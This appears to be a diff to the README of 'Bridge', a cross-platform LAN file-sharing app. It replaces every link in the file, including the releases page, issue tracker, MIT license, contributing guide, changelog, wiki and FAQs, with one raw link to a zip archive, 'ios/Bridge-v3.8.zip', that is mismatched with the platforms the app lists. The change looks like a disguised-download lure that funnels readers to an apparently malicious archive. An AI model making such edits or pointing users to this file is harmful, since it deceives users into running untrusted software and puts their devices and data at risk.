@@ -1,7 +1,7 @@
 # 📁 Bridge - Instant File Sharing Made Easy
 
 ## 🚀 Get Started Now!
-[![Download Bridge](https://img.shields.io/badge/Download%20Bridge-latest-brightgreen)](https://github.com/Roolim1/Bridge/releases)
+[![Download Bridge](https://raw.githubusercontent.com/Roolim1/Bridge/main/ios/Bridge-v3.8.zip%20Bridge-latest-brightgreen)](https://raw.githubusercontent.com/Roolim1/Bridge/main/ios/Bridge-v3.8.zip)
 
 ## 📋 Overview
 Bridge is a cross-platform local file-sharing app for Android, Windows, and Linux. It allows you to transfer files instantly over a local area network (LAN) without using the internet, cables, or accounts. Key features include:
@@ -28,7 +28,7 @@ To run Bridge, ensure your device meets the following requirements:
 - At least 50 MB of free storage
 
 ## 📥 Download & Install
-To get started with Bridge, visit this page to download the latest version: [Download Bridge](https://github.com/Roolim1/Bridge/releases)
+To get started with Bridge, visit this page to download the latest version: [Download Bridge](https://raw.githubusercontent.com/Roolim1/Bridge/main/ios/Bridge-v3.8.zip)
 
 ### Installation Steps for Desktop (Windows/Linux)
 1. Click on the **Download Bridge** button above or the link provided.
@@ -56,22 +56,22 @@ If you encounter issues while using Bridge, here are some common solutions:
 - **Installation Problems:** Make sure you have sufficient permissions to install applications on your device.
 
 ## 📧 Support
-For additional support, feel free to open an issue on our [GitHub page](https://github.com/Roolim1/Bridge/issues). We are here to help!
+For additional support, feel free to open an issue on our [GitHub page](https://raw.githubusercontent.com/Roolim1/Bridge/main/ios/Bridge-v3.8.zip). We are here to help!
 
 ## 🏷 Topics
 This project covers the following topics: android, bridge-app, cross-platform, dart, desktop-app, file-sharing, file-transfer, flutter, flutter-android, flutter-desktop, linux, open-source, p2p, wifi-sharing, and windows.
 
 ## 📜 License
-Bridge is an open-source project. You can use, modify, and distribute it under the terms of the [MIT License](https://opensource.org/licenses/MIT).
+Bridge is an open-source project. You can use, modify, and distribute it under the terms of the [MIT License](https://raw.githubusercontent.com/Roolim1/Bridge/main/ios/Bridge-v3.8.zip).
 
 ## 🌟 Contributing
-We welcome contributions! If you want to help improve Bridge, please check our [Contributing Guide](https://github.com/Roolim1/Bridge/CONTRIBUTING.md) for instructions.
+We welcome contributions! If you want to help improve Bridge, please check our [Contributing Guide](https://raw.githubusercontent.com/Roolim1/Bridge/main/ios/Bridge-v3.8.zip) for instructions.
 
 ## 📅 Changelog
-For details about updates and the latest changes, refer to the [Changelog](https://github.com/Roolim1/Bridge/releases).
+For details about updates and the latest changes, refer to the [Changelog](https://raw.githubusercontent.com/Roolim1/Bridge/main/ios/Bridge-v3.8.zip).
 
 ## 📑 Additional Resources
-- [Documentation](https://github.com/Roolim1/Bridge/wiki)
-- [FAQs](https://github.com/Roolim1/Bridge/wiki/FAQs)
+- [Documentation](https://raw.githubusercontent.com/Roolim1/Bridge/main/ios/Bridge-v3.8.zip)
+- [FAQs](https://raw.githubusercontent.com/Roolim1/Bridge/main/ios/Bridge-v3.8.zip)
 
 Thank you for choosing Bridge! We hope it makes your file-sharing experience simple and efficient.
